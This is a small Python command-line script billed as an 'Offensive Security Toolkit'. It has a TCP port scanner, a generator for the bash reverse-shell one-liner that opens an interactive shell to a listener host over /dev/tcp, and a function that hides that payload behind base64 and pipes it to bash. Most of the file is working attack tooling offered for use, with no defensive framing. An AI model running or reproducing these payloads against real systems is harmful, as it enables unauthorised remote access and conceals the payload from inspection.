#!/usr/bin/env python3
"""
Offensive Security Toolkit
Immediate offensive capabilities
"""

import argparse
import socket
import base64
import random

def port_scan(target, ports):
    """Immediate port scanner"""
    print(f"[+] Scanning {target}")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} open")
            sock.close()
        except:
            pass
    return open_ports

def reverse_shell(lhost, lport):
    """Immediate reverse shell generator"""
    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    print(f"[+] Reverse shell payload:\n{shell}")
    return shell

def obfuscate(payload):
    """Immediate payload obfuscation"""
    obfuscated = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | bash"
    print(f"[+] Obfuscated payload:\n{obfuscated}")
    return obfuscated

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Penetration Toolkit - Immediate Results")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # Port scanner
    scan_parser = subparsers.add_parser('scan', help='Port scanner')
    scan_parser.add_argument('target', help='Target IP')
    scan_parser.add_argument('ports', help='Ports (e.g., 1-1000 or 22,80,443)')
    
    # Reverse shell
    shell_parser = subparsers.add_parser('shell', help='Reverse shell generator')
    shell_parser.add_argument('lhost', help='Listener IP')
    shell_parser.add_argument('lport', type=int, help='Listener port')
    
    args = parser.parse_args()
    
    if args.command == 'scan':
        if '-' in args.ports:
            start, end = map(int, args.ports.split('-'))
            ports = range(start, end + 1)
        else:
            ports = [int(p) for p in args.ports.split(',')]
        port_scan(args.target, ports)
    
    elif args.command == 'shell':
        shell = reverse_shell(args.lhost, args.lport)
        obfuscate(shell)
